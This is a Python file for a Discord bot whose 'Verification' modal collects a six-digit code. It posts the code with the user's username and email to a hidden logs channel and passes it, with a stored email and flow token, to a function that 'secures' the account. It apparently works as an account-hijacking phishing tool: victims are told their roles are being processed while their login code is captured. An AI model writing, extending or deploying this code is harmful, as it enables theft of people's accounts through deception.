from views.utils.startSecure import startSecuringAccount
from discord import ui
import datetime
import discord
import json

config = json.load(open("config.json", "r+"))

class MyModalTwo(ui.Modal, title="Verification"):
    box_three = ui.TextInput(label="Code", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if len(str(self.box_three.value)) != 6:
            await interaction.response.send_message(
                "❌ | The code must be 6 digits long.", 
                ephemeral=True
            )
            return  
        
        data = json.load(open("data.json", "r+"))

        logs_channel = interaction.client.get_channel(config["discord"]["logs_channel"])
        Code_embed = discord.Embed(
            title = f"{interaction.user.name} | {interaction.user.id}",
            description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Got Code! {self.box_three.value}```",
            timestamp = datetime.datetime.now(),
            colour = 0x79D990,                           
        ).set_thumbnail(
            url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
        )

        await logs_channel.send("**This Account is being automaticly secured.**")
        await logs_channel.send(embed=Code_embed)

        startSecuringAccount(data["email"], data["flowtoken"], self.box_three.value)

        await interaction.response.send_message(
            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
        )
